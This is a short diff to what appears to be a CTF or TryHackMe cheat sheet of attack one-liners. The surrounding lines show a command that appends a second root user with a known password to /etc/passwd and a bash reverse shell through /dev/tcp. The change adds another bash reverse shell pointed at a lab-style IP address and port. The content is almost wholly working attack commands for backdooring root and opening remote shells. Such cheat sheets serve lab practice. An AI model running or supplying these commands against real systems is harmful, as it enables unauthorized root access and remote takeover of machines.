@@ -331,6 +331,8 @@ echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
 - One line bash reverse shell
 ```
 bash -i >& /dev/tcp/your_thm_ip/some_port_to_listen_on 0>&1;
+
+bash -c "bash -i >& /dev/tcp/10.10.14.13/8133 0>&1"
 ```
 - One line rm reverse shell
 ```
